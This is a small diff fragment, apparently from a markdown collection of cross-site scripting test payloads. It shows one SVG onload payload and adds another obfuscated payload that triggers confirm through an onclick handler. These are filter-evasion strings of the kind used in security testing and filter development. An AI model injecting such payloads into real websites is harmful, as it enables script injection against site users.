@@ -6,3 +6,4 @@
 **Payload:**<br/>`"/**/></*svg*/><svg/*test*/onload=alert(/xss/)/*111*/>`
 
 
+**Payload:**<br/> `<d3"<"/onclick="1>[confirm``]"<">z `
